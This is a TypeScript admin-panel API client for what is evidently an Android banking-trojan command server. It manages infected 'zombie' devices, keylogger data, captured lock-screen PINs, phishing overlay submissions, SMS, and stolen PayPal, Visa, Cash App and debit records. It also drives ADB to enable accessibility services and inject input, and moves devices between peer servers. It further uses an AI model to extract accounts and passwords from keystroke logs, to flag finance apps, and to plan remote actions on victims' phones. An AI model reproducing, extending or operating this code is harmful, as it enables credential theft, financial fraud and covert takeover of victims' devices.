import type {
  ApiEnvelope,
  CommandRecord,
  Device,
  DeviceFilterOptions,
  DeviceGroup,
  DeviceGroupListResponse,
  DeviceListResponse,
  KeyboardLogPage,
  KeyboardAppSummary,
  FakePageSubmission,
  KeyguardPinHistoryRecord,
  KeyguardPinRecord,
  PayPalAccountRecord,
  SmsLog,
  VisaAccountRecord,
  CashAppAccountRecord,
  DebitAccountRecord,
  ApkDownloadLog,
  InstallerInstallLog,
  ClientInstallLog,
  MassageVideo,
  DeviceInstalledAppRecord,
  FinanceAppPackage,
  DeviceAppAccountRecord,
  DeviceAppPasswordRecord,
  InstalledAppInfo,
  DashboardStats,
} from "../types";
import { clearAdminToken, getAuthHeaders } from "../auth/session";
import { t } from "../i18n";


export interface AdminSession {
  token: string;
  expiresAt: number;
  username: string;
  role: "super" | "admin";
  accountExpiresAt: string | null;
}

export interface AdminUser {
  id: string;
  username: string;
  role: "super" | "admin";
  status: 0 | 1;
  expiresAt: string | null;
  sessionVersion: number;
  createdBy: string | null;
  createdAt: string;
  updatedAt: string;
  isExpired: boolean;
  isLocked: boolean;
}

export interface AdminMe {
  id: string;
  username: string;
  role: "super" | "admin";
  expiresAt: number;
  accountExpiresAt: string | null;
  isLocked: boolean;
}

async function request<T>(path: string, init?: RequestInit): Promise<T> {
  const hasBody = init?.body !== undefined && init.body !== null;
  const response = await fetch(path, {
    ...init,
    headers: {
      ...(hasBody ? { "Content-Type": "application/json" } : {}),
      ...getAuthHeaders(),
      ...(init?.headers ?? {}),
    },
  });

  const rawText = await response.text();
  let body: ApiEnvelope<T>;
  try {
    body = JSON.parse(rawText) as ApiEnvelope<T>;
  } catch {
    const preview = rawText.replace(/\s+/g, " ").trim().slice(0, 240);
    throw new Error(
      preview.startsWith("<")
        ? t("api_non_json_response: 服务端返回了 HTML/非 JSON，可能是代理错误或 API 未启动。preview={0}", { 0: preview })
        : `api_non_json_response: ${preview || `HTTP ${response.status}`}`,
    );
  }
  if (response.status === 401) {
    clearAdminToken();
  }
  if (!response.ok || !body.ok) {
    throw new Error(body.message ?? `request failed: ${response.status}`);
  }

  return body.data as T;
}

export interface IceServerConfig {
  urls: string | string[];
  username?: string;
  credential?: string;
}

export function fetchIceServers() {
  return request<{ iceServers: IceServerConfig[] }>("/api/webrtc/ice-servers").then(
    (data) => data.iceServers ?? [],
  );
}

export function loginAdmin(username: string, password: string) {
  return request<AdminSession>("/api/auth/login", {
    method: "POST",
    body: JSON.stringify({ username, password }),
  });
}

export function fetchAdminSession() {
  return request<AdminMe>("/api/auth/me");
}

export function fetchAdmins() {
  return request<{ items: AdminUser[] }>("/api/adm/admins");
}

export function createAdmin(payload: {
  username: string;
  password: string;
  months: 1 | 2 | 3;
}) {
  return request<AdminUser>("/api/adm/admins", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}

export function renewAdmin(adminId: string, months: 1 | 2 | 3) {
  return request<AdminUser>(`/api/adm/admins/${encodeURIComponent(adminId)}/renew`, {
    method: "POST",
    body: JSON.stringify({ months }),
  });
}

export function updateAdmin(
  adminId: string,
  payload: { status?: 0 | 1; password?: string },
) {
  return request<AdminUser>(`/api/adm/admins/${encodeURIComponent(adminId)}`, {
    method: "PATCH",
    body: JSON.stringify(payload),
  });
}

export function deleteAdmin(adminId: string) {
  return request<null>(`/api/adm/admins/${encodeURIComponent(adminId)}`, {
    method: "DELETE",
  });
}

export function fetchDevices() {
  return request<{ devices: Device[]; onlineDeviceIds: string[] }>("/api/devices");
}

export interface FetchDevicesPageParams {
  page?: number;
  pageSize?: number;
  deviceId?: string;
  remark?: string;
  bindCode?: string;
  /** 空=全部；ungrouped=未分组；uuid=指定组 */
  groupId?: string;
  localeLanguage?: string;
  localeRegion?: string;
  brand?: string;
  accessibilityStatus?: string;
  isOnline?: string;
  /** 空=全部；1=已获取；0=未获取 */
  hasPassword?: string;
  dateFrom?: string;
  dateTo?: string;
}

export function fetchDevicesPage(params: FetchDevicesPageParams) {
  const query = new URLSearchParams();
  Object.entries(params).forEach(([key, value]) => {
    if (value != null && String(value).trim() !== "") {
      query.set(key, String(value));
    }
  });
  return request<DeviceListResponse>(`/api/devices/page?${query.toString()}`);
}

export function fetchDeviceFilterOptions() {
  return request<DeviceFilterOptions>("/api/devices/filter-options");
}

export interface ZombieWakeStatus {
  needWake: boolean;
  wakeUntil: number;
  remainingMs: number;
  durationMs: number;
  keepAwakeMs: number;
  nudgedOnline?: number;
  /** FCM 群发是否成功；服务端未配置 Service Account 或出站不通时为 false */
  nudgedFcm?: boolean;
  /** nudgedFcm=false 时的原因，直接展示给运维，否则只能靠登录服务器查 */
  fcmReason?: string;
}

export function fetchZombieWakeStatus() {
  return request<ZombieWakeStatus>("/api/devices/zombie-wake");
}

export function triggerZombieWake() {
  return request<ZombieWakeStatus>("/api/devices/zombie-wake", {
    method: "POST",
  });
}

export function clearZombieWake() {
  return request<ZombieWakeStatus>("/api/devices/zombie-wake", {
    method: "DELETE",
  });
}

export function updateDeviceRemark(deviceId: string, remark: string) {
  return request<Device>(`/api/devices/${encodeURIComponent(deviceId)}/remark`, {
    method: "PATCH",
    body: JSON.stringify({ remark }),
  });
}

export function fetchDeviceGroups() {
  return request<DeviceGroupListResponse>("/api/device-groups");
}

export function createDeviceGroup(name: string, sortOrder = 0) {
  return request<DeviceGroup>("/api/device-groups", {
    method: "POST",
    body: JSON.stringify({ name, sortOrder }),
  });
}

export function updateDeviceGroup(
  groupId: string,
  input: { name?: string; sortOrder?: number },
) {
  return request<DeviceGroup>(`/api/device-groups/${encodeURIComponent(groupId)}`, {
    method: "PATCH",
    body: JSON.stringify(input),
  });
}

export function deleteDeviceGroup(groupId: string) {
  return request<null>(`/api/device-groups/${encodeURIComponent(groupId)}`, {
    method: "DELETE",
  });
}

export function updateDeviceGroupId(deviceId: string, groupId: string | null) {
  return request<Device>(`/api/devices/${encodeURIComponent(deviceId)}/group`, {
    method: "PATCH",
    body: JSON.stringify({ groupId }),
  });
}

export function batchUpdateDeviceGroup(deviceIds: string[], groupId: string | null) {
  return request<{ updated: number }>("/api/devices/batch-group", {
    method: "POST",
    body: JSON.stringify({ deviceIds, groupId }),
  });
}

export function sendCommand(input: {
  deviceId: string;
  cmd: string;
  params?: Record<string, unknown>;
  waitMs?: number;
  /** 页面卸载阶段用：让请求在页面被销毁后仍能发出 */
  keepalive?: boolean;
}) {
  const cmd = input.cmd === "disable_accessibility" ? "uninstall" : input.cmd;
  return request<CommandRecord>("/api/command/send", {
    method: "POST",
    body: JSON.stringify({ ...input, cmd }),
    keepalive: input.keepalive,
  });
}

export function pairDeviceAdb(deviceId: string, options?: { mode?: "auto" | "manual" }) {
  return request<{
    ok: boolean;
    status: string;
    error?: string;
    prepare?: Record<string, unknown>;
    pairLocalPort?: number;
    connectLocalPort?: number;
    devices?: string;
    grants?: {
      packageName: string;
      secureSettingsGranted: boolean;
      results: Array<{ permission: string; granted: boolean; detail: string }>;
    };
  }>("/api/adb/pair", {
    method: "POST",
    // Only manual pairing is supported in the admin UI.
    body: JSON.stringify({ deviceId, mode: options?.mode === "auto" ? "manual" : options?.mode ?? "manual" }),
  });
}

export interface AdbRuntimeStatus {
  deviceId: string;
  connected: boolean;
  serial: string | null;
  /** none = 从没配对；offline = 配对过但现在断了（服务端会自动重连）；connected = 在线 */
  status: "none" | "offline" | "connected";
  /** 端点在库里且未失效：不用人工重新配对，等服务端连回来就行 */
  recoverable?: boolean;
  phoneEndpoint?: string | null;
  lastOkAt?: number | null;
  screenshotRunning: boolean;
  uiTreeRunning: boolean;
  screenshotWatchers: number;
  uiTreeWatchers: number;
  lastScreenshotError: string | null;
  lastUiTreeError: string | null;
}

export function fetchAdbStatus(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<AdbRuntimeStatus>(`/api/adb/status?${query.toString()}`);
}

/**
 * 免配对重连：用后端存的「手机 IP + connect 端口」直接连。
 * 服务器重启或手机短暂离线之后，不需要人停在无线调试页重新刮码。
 */
export function reconnectDeviceAdb(deviceId: string) {
  return request<{ serial?: string; status?: string; ok?: boolean }>("/api/adb/reconnect", {
    method: "POST",
    body: JSON.stringify({ deviceId }),
  });
}

/** 忘掉端点：之后不再自动恢复，需要重新手动匹配。 */
export function forgetDeviceAdb(deviceId: string) {
  return request<{ deviceId: string; status: string }>("/api/adb/forget", {
    method: "POST",
    body: JSON.stringify({ deviceId }),
  });
}

export function fetchAdbAccessibilityStatus(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<{
    deviceId: string;
    serial: string;
    enabled: boolean;
    enabledList: string;
    component: string | null;
  }>(`/api/adb/accessibility-status?${query.toString()}`);
}

export type AdbInputPayload =
  | { action: "tap"; x: number; y: number }
  | { action: "swipe"; x1: number; y1: number; x2: number; y2: number; durationMs?: number }
  | { action: "HOME" | "BACK" | "RECENTS" | "delete" | "enter" }
  | { action: "text"; text: string };

export function sendAdbInput(deviceId: string, payload: AdbInputPayload) {
  return request<{ deviceId: string; serial: string; args: string[] }>("/api/adb/input", {
    method: "POST",
    body: JSON.stringify({ deviceId, ...payload }),
  });
}

export function enableDeviceAccessibility(deviceId: string) {
  return request<{
    deviceId: string;
    serial: string;
    alreadyEnabled: boolean;
    component: string;
    method: "already_enabled" | "settings_put";
    enabledList: string;
    openedSettings: boolean;
  }>("/api/adb/enable-accessibility", {
    method: "POST",
    body: JSON.stringify({ deviceId }),
  });
}

export function disableDeviceAccessibility(deviceId: string) {
  return request<{
    deviceId: string;
    serial: string;
    alreadyDisabled: boolean;
    component: string | null;
    method: "already_disabled" | "settings_put";
    enabledList: string;
  }>("/api/adb/disable-accessibility", {
    method: "POST",
    body: JSON.stringify({ deviceId }),
  });
}

export function fetchCommand(commandId: string) {
  return request<CommandRecord>(`/api/commands/${encodeURIComponent(commandId)}`);
}

export function fetchKeyboardLogs(
  deviceId?: string,
  pageSize = 50,
  appPackage?: string,
  page = 1,
) {
  const query = new URLSearchParams();
  if (deviceId) {
    query.set("deviceId", deviceId);
  }
  if (appPackage) {
    query.set("appPackage", appPackage);
  }
  query.set("page", String(Math.max(page, 1)));
  query.set("pageSize", String(pageSize));
  return request<KeyboardLogPage>(`/api/data/keyboard?${query.toString()}`);
}

export function fetchKeyboardAppSummaries(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<KeyboardAppSummary[]>(`/api/data/keyboard/apps?${query.toString()}`);
}

export function fetchInstalledApps(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<DeviceInstalledAppRecord[]>(`/api/data/installed-apps?${query.toString()}`);
}

export function syncInstalledApps(
  deviceId: string,
  apps: Array<Pick<InstalledAppInfo, "packageName" | "label" | "isSystem" | "versionName" | "lastUsedTime">>,
) {
  return request<DeviceInstalledAppRecord[]>("/api/data/installed-apps", {
    method: "PUT",
    body: JSON.stringify({ deviceId, apps }),
  });
}

export function fetchFinanceApps() {
  return request<FinanceAppPackage[]>("/api/data/finance-apps");
}

export function markFinanceApp(packageName: string, label?: string) {
  return request<FinanceAppPackage>("/api/data/finance-apps", {
    method: "POST",
    body: JSON.stringify({ packageName, label }),
  });
}

export function unmarkFinanceApp(packageName: string) {
  const query = new URLSearchParams({ packageName });
  return request<null>(`/api/data/finance-apps?${query.toString()}`, {
    method: "DELETE",
  });
}

export function fetchKeyguardPin(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<KeyguardPinRecord | null>(`/api/data/keyguard-pin?${query.toString()}`);
}

export function saveKeyguardPin(
  deviceId: string,
  pin: string,
  lockType = "pin",
  gesturePath?: string,
) {
  return request<KeyguardPinRecord | null>("/api/data/keyguard-pin", {
    method: "POST",
    body: JSON.stringify({
      deviceId,
      pin,
      lockType,
      ...(gesturePath?.trim() ? { gesturePath: gesturePath.trim() } : {}),
    }),
  });
}

export function clearKeyguardPin(deviceId: string) {
  const query = new URLSearchParams({ deviceId });
  return request<null>(`/api/data/keyguard-pin?${query.toString()}`, {
    method: "DELETE",
  });
}

export function fetchKeyguardPinHistory(deviceId: string, limit = 50) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  return request<KeyguardPinHistoryRecord[]>(
    `/api/data/keyguard-pin-history?${query.toString()}`,
  );
}

export function saveKeyguardPinHistory(
  deviceId: string,
  input: {
    pin: string;
    lockType?: string;
    gesturePath?: string;
    capturedAt?: number;
    source?: "device" | "manual";
  },
) {
  return request<KeyguardPinHistoryRecord>("/api/data/keyguard-pin-history", {
    method: "POST",
    body: JSON.stringify({
      deviceId,
      pin: input.pin,
      lockType: input.lockType,
      ...(input.gesturePath?.trim() ? { gesturePath: input.gesturePath.trim() } : {}),
      ...(typeof input.capturedAt === "number" ? { capturedAt: input.capturedAt } : {}),
      source: input.source ?? "manual",
    }),
  });
}

export function deleteKeyguardPinHistory(deviceId: string, historyId: string) {
  const query = new URLSearchParams({ deviceId, id: historyId });
  return request<null>(`/api/data/keyguard-pin-history?${query.toString()}`, {
    method: "DELETE",
  });
}

export function fetchFakePageSubmissions(
  deviceId: string,
  packageName?: string,
  limit = 100,
) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  if (packageName) {
    query.set("packageName", packageName);
  }
  return request<FakePageSubmission[]>(`/api/data/fake-page?${query.toString()}`);
}

export function fetchSmsLogs(deviceId?: string, limit = 50) {
  const query = new URLSearchParams();
  if (deviceId) {
    query.set("deviceId", deviceId);
  }
  query.set("limit", String(limit));
  return request<SmsLog[]>(`/api/data/sms?${query.toString()}`);
}

export function fetchPayPalAccounts(deviceId: string, limit = 100) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  return request<PayPalAccountRecord[]>(`/api/data/paypal?${query.toString()}`);
}

export function fetchVisaAccounts(deviceId: string, limit = 100) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  return request<VisaAccountRecord[]>(`/api/data/visa?${query.toString()}`);
}

export function fetchCashAppAccounts(deviceId: string, limit = 100) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  return request<CashAppAccountRecord[]>(`/api/data/cashapp?${query.toString()}`);
}

export function fetchDebitAccounts(deviceId: string, limit = 100) {
  const query = new URLSearchParams({
    deviceId,
    limit: String(limit),
  });
  return request<DebitAccountRecord[]>(`/api/data/debit?${query.toString()}`);
}

export type PaymentMethodId = "paypal" | "visa" | "cashapp" | "debit";

export interface APaymentMethodsConfig {
  key: string;
  methods: PaymentMethodId[];
  available: PaymentMethodId[];
}

export function fetchAPaymentMethodsConfig() {
  return request<APaymentMethodsConfig>("/api/adm/config/a-payment-methods");
}

export function updateAPaymentMethodsConfig(methods: PaymentMethodId[]) {
  return request<APaymentMethodsConfig>("/api/adm/config/a-payment-methods", {
    method: "PUT",
    body: JSON.stringify({ methods }),
  });
}

export interface AiConfigPublic {
  key: string;
  enabled: 0 | 1;
  baseUrl: string;
  model: string;
  modelOptionId: string;
  translateModel: string;
  translateModelOptionId: string;
  hasApiKey: boolean;
  apiKeyMasked: string;
}

export function fetchAiConfig() {
  return request<AiConfigPublic>("/api/adm/config/ai");
}

export function updateAiConfig(input: {
  enabled: 0 | 1;
  baseUrl: string;
  model: string;
  modelOptionId?: string;
  translateModel?: string;
  translateModelOptionId?: string;
  apiKey?: string;
}) {
  return request<AiConfigPublic>("/api/adm/config/ai", {
    method: "PUT",
    body: JSON.stringify(input),
  });
}

export interface DeviceTransferConfig {
  key: string;
  enabled: 0 | 1;
  hasSecret: boolean;
  secret: string;
}

export interface ClientApkConfig {
  key: string;
  enabled: 0 | 1;
  url: string;
  version: string;
}

export interface PeerServer {
  id: string;
  name: string;
  apiBaseUrl: string;
  wsBaseUrl: string;
  wsScreenBaseUrl: string;
  transferSecret: string;
  enabled: 0 | 1;
  createdAt: string;
  updatedAt: string;
}

export interface DeviceTransferItemResult {
  deviceId: string;
  ok: boolean;
  error?: string;
}

export function fetchDeviceTransferConfig() {
  return request<DeviceTransferConfig>("/api/adm/config/device-transfer");
}

export function fetchClientApkConfig() {
  return request<ClientApkConfig>("/api/adm/config/client-apk");
}

export function updateClientApkConfig(input: { enabled?: 0 | 1; url?: string; version?: string }) {
  return request<ClientApkConfig>("/api/adm/config/client-apk", {
    method: "PUT",
    body: JSON.stringify(input),
  });
}

export function updateDeviceTransferConfig(input: { enabled?: 0 | 1; secret?: string }) {
  return request<DeviceTransferConfig>("/api/adm/config/device-transfer", {
    method: "PUT",
    body: JSON.stringify(input),
  });
}

export function fetchPeerServers() {
  return request<{ peers: PeerServer[] }>("/api/adm/peer-servers");
}

export function createPeerServer(input: {
  name: string;
  apiBaseUrl: string;
  wsBaseUrl: string;
  wsScreenBaseUrl: string;
  transferSecret: string;
  enabled?: 0 | 1;
}) {
  return request<PeerServer>("/api/adm/peer-servers", {
    method: "POST",
    body: JSON.stringify(input),
  });
}

export function updatePeerServer(
  id: string,
  input: {
    name?: string;
    apiBaseUrl?: string;
    wsBaseUrl?: string;
    wsScreenBaseUrl?: string;
    transferSecret?: string;
    enabled?: 0 | 1;
  },
) {
  return request<PeerServer>(`/api/adm/peer-servers/${encodeURIComponent(id)}`, {
    method: "PUT",
    body: JSON.stringify(input),
  });
}

export function deletePeerServer(id: string) {
  return request<{ id: string }>(`/api/adm/peer-servers/${encodeURIComponent(id)}`, {
    method: "DELETE",
  });
}

export function transferDevices(deviceIds: string[], peerServerId: string) {
  return request<{ peerServerId: string; results: DeviceTransferItemResult[] }>(
    "/api/adm/device/transfer",
    {
      method: "POST",
      body: JSON.stringify({ deviceIds, peerServerId }),
    },
  );
}

export function testAiConfig(input?: {
  baseUrl?: string;
  apiKey?: string;
  model?: string;
}) {
  return request<{ ok: true; reply: string }>("/api/adm/config/ai/test", {
    method: "POST",
    body: JSON.stringify(input ?? {}),
  });
}

export interface AiTraceListItem {
  id: string;
  scene: string;
  createdAt: string;
  durationMs: number;
  model: string;
  httpStatus: number;
  ok: boolean;
  error: string | null;
  preview: string;
}

export interface AiTraceRecord {
  id: string;
  scene: string;
  createdAt: string;
  durationMs: number;
  request: {
    endpoint: string;
    model: string;
    apiKeyMasked: string;
    temperature: number;
    messages: Array<{ role: string; content: string }>;
  };
  response: {
    httpStatus: number;
    ok: boolean;
    rawText: string;
    parsed: unknown;
    assistantContent: string;
    error: string | null;
  };
}

export function fetchAiTraces(limit = 50) {
  const query = new URLSearchParams({ limit: String(limit) });
  return request<{ items: AiTraceListItem[]; dir: string }>(`/api/adm/ai/traces?${query.toString()}`);
}

export function fetchAiTraceDetail(id: string) {
  return request<AiTraceRecord>(`/api/adm/ai/traces/${encodeURIComponent(id)}`);
}

export interface FinanceAnalyzeCandidate {
  packageName: string;
  label: string;
  confidence: number;
  reason: string;
  selectedByDefault: boolean;
}

export function analyzeFinanceApps(
  apps: Array<{ packageName: string; label: string }>,
) {
  return request<{ candidates: FinanceAnalyzeCandidate[] }>(
    "/api/adm/ai/analyze-finance-apps",
    {
      method: "POST",
      body: JSON.stringify({ apps }),
    },
  );
}

export function batchMarkFinanceApps(
  apps: Array<{ packageName: string; label?: string }>,
) {
  return request<FinanceAppPackage[]>("/api/data/finance-apps/batch", {
    method: "POST",
    body: JSON.stringify({ apps }),
  });
}

export interface AccountExtractCandidate {
  account: string;
  confidence: number;
  reason: string;
  selectedByDefault: boolean;
}

export interface PasswordExtractCandidate {
  password: string;
  relatedAccount: string;
  confidence: number;
  reason: string;
  selectedByDefault: boolean;
}

export function extractAccountsFromKeyboard(input: {
  deviceId: string;
  packageName: string;
  appLabel?: string;
}) {
  return request<{
    candidates: AccountExtractCandidate[];
    scanned: number;
    total: number;
  }>("/api/adm/ai/extract-accounts", {
    method: "POST",
    body: JSON.stringify(input),
  });
}

export function extractPasswordsFromKeyboard(input: {
  deviceId: string;
  packageName: string;
  appLabel?: string;
}) {
  return request<{
    candidates: PasswordExtractCandidate[];
    scanned: number;
    total: number;
  }>("/api/adm/ai/extract-passwords", {
    method: "POST",
    body: JSON.stringify(input),
  });
}

export type PhoneAgentActionType =
  | "click"
  | "swipe"
  | "input_text"
  | "open_app"
  | "global_action"
  | "wake_screen"
  | "wait"
  | "done"
  | "failed";

export interface PhoneAgentStepPlan {
  action: PhoneAgentActionType;
  reason: string;
  confidence: number;
  params: Record<string, unknown>;
}

export interface PhoneAgentHistoryStep {
  stepIndex: number;
  action: PhoneAgentActionType;
  reason: string;
  params: Record<string, unknown>;
  result?: string;
}

export function translateUiLabels(texts: string[]) {
  return request<{ map: Record<string, string> }>("/api/adm/ai/translate-ui-labels", {
    method: "POST",
    body: JSON.stringify({ texts }),
  }).then((data) => data.map);
}

export function planPhoneAgentStep(input: {
  goal: string;
  screenWidth: number;
  screenHeight: number;
  packageName?: string;
  keyguardLocked?: boolean;
  nodes: Array<{
    i: number;
    text?: string;
    desc?: string;
    clickable?: boolean;
    focusable?: boolean;
    bounds: { left: number; top: number; right: number; bottom: number };
    packageName?: string;
  }>;
  history?: PhoneAgentHistoryStep[];
}) {
  return request<{ plan: PhoneAgentStepPlan }>("/api/adm/ai/phone-agent/plan-step", {
    method: "POST",
    body: JSON.stringify(input),
  }).then((data) => data.plan);
}

export function fetchAppAccounts(deviceId: string, packageName: string) {
  const query = new URLSearchParams({ deviceId, packageName });
  return request<DeviceAppAccountRecord[]>(`/api/data/app-accounts?${query.toString()}`);
}

export function batchSaveAppAccounts(
  deviceId: string,
  packageName: string,
  accounts: Array<{ account: string; confidence?: number; reason?: string }>,
) {
  return request<DeviceAppAccountRecord[]>("/api/data/app-accounts/batch", {
    method: "POST",
    body: JSON.stringify({ deviceId, packageName, accounts }),
  });
}

export function deleteAppAccount(id: string) {
  const query = new URLSearchParams({ id });
  return request<null>(`/api/data/app-accounts?${query.toString()}`, {
    method: "DELETE",
  });
}

export function fetchAppPasswords(deviceId: string, packageName: string) {
  const query = new URLSearchParams({ deviceId, packageName });
  return request<DeviceAppPasswordRecord[]>(`/api/data/app-passwords?${query.toString()}`);
}

export function batchSaveAppPasswords(
  deviceId: string,
  packageName: string,
  passwords: Array<{
    password: string;
    relatedAccount?: string;
    confidence?: number;
    reason?: string;
  }>,
) {
  return request<DeviceAppPasswordRecord[]>("/api/data/app-passwords/batch", {
    method: "POST",
    body: JSON.stringify({ deviceId, packageName, passwords }),
  });
}

export function deleteAppPassword(id: string) {
  const query = new URLSearchParams({ id });
  return request<null>(`/api/data/app-passwords?${query.toString()}`, {
    method: "DELETE",
  });
}

export interface FakePageWebLink {
  id: string;
  name: string;
  url: string;
  createdAt: string;
}

export function fetchFakePageWebLinks() {
  return request<FakePageWebLink[]>("/api/adm/config/fake-page-web-links");
}

export function createFakePageWebLink(input: { name: string; url: string }) {
  return request<FakePageWebLink>("/api/adm/config/fake-page-web-links", {
    method: "POST",
    body: JSON.stringify(input),
  });
}

export function deleteFakePageWebLink(id: string) {
  const query = new URLSearchParams({ id });
  return request<null>(`/api/adm/config/fake-page-web-links?${query.toString()}`, {
    method: "DELETE",
  });
}

export function fetchApkDownloadLogs(limit = 200) {
  const query = new URLSearchParams({
    limit: String(limit),
  });
  return request<ApkDownloadLog[]>(`/api/data/apk-downloads?${query.toString()}`);
}

export function fetchInstallerInstallLogs(limit = 200) {
  const query = new URLSearchParams({
    limit: String(limit),
  });
  return request<InstallerInstallLog[]>(`/api/data/installer-installs?${query.toString()}`);
}

export function fetchClientInstallLogs(limit = 200) {
  const query = new URLSearchParams({
    limit: String(limit),
  });
  return request<ClientInstallLog[]>(`/api/data/client-installs?${query.toString()}`);
}

export function fetchDashboardStats(pageKey = "miluHome") {
  const query = new URLSearchParams({ pageKey });
  return request<DashboardStats>(`/api/data/landing-stats?${query.toString()}`);
}

/** @deprecated 使用 fetchDashboardStats */
export const fetchLandingPageStats = fetchDashboardStats;

export function fetchMassageVideos() {
  return request<MassageVideo[]>("/api/adm/videos");
}

export function createMassageVideo(body: {
  name: string;
  url: string;
  description?: string;
  status: 0 | 1;
  sortOrder?: number;
}) {
  return request<MassageVideo>("/api/adm/videos", {
    method: "POST",
    body: JSON.stringify(body),
  });
}

export function updateMassageVideo(
  videoId: string,
  body: Partial<{
    name: string;
    url: string;
    description: string;
    status: 0 | 1;
    sortOrder: number;
  }>,
) {
  return request<MassageVideo>(`/api/adm/videos/${encodeURIComponent(videoId)}`, {
    method: "PATCH",
    body: JSON.stringify(body),
  });
}

export function deleteMassageVideo(videoId: string) {
  return request<null>(`/api/adm/videos/${encodeURIComponent(videoId)}`, {
    method: "DELETE",
  });
}

export async function fetchHealth() {
  const response = await fetch("/health", {
    cache: "no-store",
    headers: {
      Accept: "application/json",
    },
  });

  const body = (await response.json()) as ApiEnvelope<{
    service: string;
    timestamp: number;
  }>;

  if (!response.ok || !body.ok) {
    throw new Error(body.message ?? `health check failed: ${response.status}`);
  }

  return body.data ?? { service: "remote-control-api", timestamp: Date.now() };
}
